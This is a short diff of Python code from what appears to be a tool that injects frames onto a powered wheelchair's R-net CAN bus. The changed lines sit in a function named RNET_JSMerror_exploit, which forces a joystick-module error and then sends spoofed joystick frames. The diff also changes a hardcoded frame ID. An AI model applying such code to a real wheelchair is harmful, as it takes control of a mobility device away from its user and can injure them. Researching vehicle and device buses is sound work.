@@ -320,7 +320,6 @@ def send_joystick_canframe(s,joy_id):
         priorjoyy=joyy
         while rnet_threads_running:
                 joyframe = joy_id+'#'+dec2hex(joyx,2)+dec2hex(joyy,2)
-                print (joyframe)
                 cansend(s,joyframe)
                 nexttime += mintime
                 t= time()
@@ -353,7 +352,7 @@ def RNET_JSMerror_exploit(cansocket):
         t=time()+0.20
         print("Waiting for joy frame")
         #joy_id = wait_joystickframe(cansocket,t)   #need to be rewritten using CAN lib
-        joy_id = "02000000" #may work only for exact wheelchair
+        joy_id = "02000100" #may work only for exact wheelchair
         print("Using joy frame: "+joy_id)
         induce_JSM_error(cansocket)
         print("3 x 0c000000# sent")
